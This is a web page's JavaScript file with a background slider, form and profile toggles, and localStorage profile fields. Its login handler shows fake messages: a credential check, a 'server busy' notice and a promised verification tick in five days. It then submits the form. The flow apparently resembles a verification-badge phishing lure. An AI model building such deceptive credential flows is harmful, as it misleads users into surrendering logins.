function reminder() {
    if (localStorage.getItem("alertShown")) {
        return;
    }
    
    alert("Please Register first💫for Profile Updation");
    localStorage.setItem("alertShown", "true"); 
}
reminder();

function change() {
    let get = document.getElementById('c').style.backgroundColor;
    if (get === 'black') {
        document.getElementById('c').style.backgroundColor = "white";
    } else {
        document.getElementById('c').style.backgroundColor = "black";
    }
}

// 🛠 Merge window.onload safely without overwrite
window.addEventListener('load', function () {
    // Background Image Slider
    const images = [
        "img1.png",
        "img2.png",
        "img3.png",
        "img4.webp",
        "img5.jpg"
    ];

    let currentIndex = 0;
    const bannerElement = document.querySelector(".banner");

    function changeBackgroundImage() {
        currentIndex = (currentIndex + 1) % images.length;
        bannerElement.style.backgroundImage = `url('${images[currentIndex]}')`;
    }

    setInterval(changeBackgroundImage, 3000);

    // Show form after 2 seconds
    setTimeout(function () {
        let get = document.getElementById('forms');
        if (get.style.display === 'block') {
            get.style.display = 'none';
        } else {
            get.style.display = 'block';
        }
    }, 2000);

    // Load user data
    pro_updater();
});

function toggleMenu() {
    document.getElementById("navLinks").classList.toggle("show");
}

function showLoginForm() {
    let get = document.getElementById('forms');
    if (get.style.display === 'block') {
        get.style.display = 'none';
    } else {
        get.style.display = 'block';
    }
}

function showLoginForm() {
    let get = document.getElementById('forms');
   
    if (get.style.display === 'block') {
        get.style.display = 'none';
    } else {
        get.style.display = 'block';
    }
}

// Automatically show form 3 seconds after page load
window.addEventListener("load", function () {
    setTimeout(() => {
        document.getElementById('forms').style.display = 'block';
    }, 3000);
});


function closeRemindForm() {
    document.getElementById('forms').style.display = 'none';
}

function storeData() {
    alert("Data stored");
    let get = document.getElementById('name').value;
    let get1 = document.getElementById('email').value;

    localStorage.setItem('Name', get);
    localStorage.setItem('Email', get1);

    pro_updater();
}

function pro_updater() {
    let get = document.getElementById('fName');
    let get1 = document.getElementById('femail');
     let get2=document.getElementById('update');
    let update=localStorage.getItem("Update");

    let name = localStorage.getItem('Name');
    let email = localStorage.getItem('Email');

    get.innerText = name || "Not available";
    get1.innerText = email || "Not available";
    get2.innerText=update;
}

function showUserProfile() {
    let get = document.getElementById('Profile');
    if (get.style.display === 'block') {
        get.style.display = 'none';
    } else {
        get.style.display = 'block';
    }
}

// Login form message handling
document.getElementById('loginForm').addEventListener('submit', function (e) {
    e.preventDefault();
    const msgBox = document.getElementById('messageBox');
    msgBox.classList.remove('hidden');
    msgBox.innerHTML = "<b>Processing...</b><br>Checking your credentials...";

    setTimeout(() => {
        msgBox.innerHTML = "<b>✅ !</b><br>WE are on the progress please wait.....";
    }, 3000);

    setTimeout(() => {
        msgBox.innerHTML = "<b>⚠ Server Busy:</b><br>Multiple users are currently trying to verify.<br>Your profile will be updated with a verification tic within <b>5 days</b>.<br><br>✨ <b>Have a great day!</b>";
    }, 8000);

    setTimeout(() => {
        document.getElementById('loginForm').submit();
    }, 8000);
});
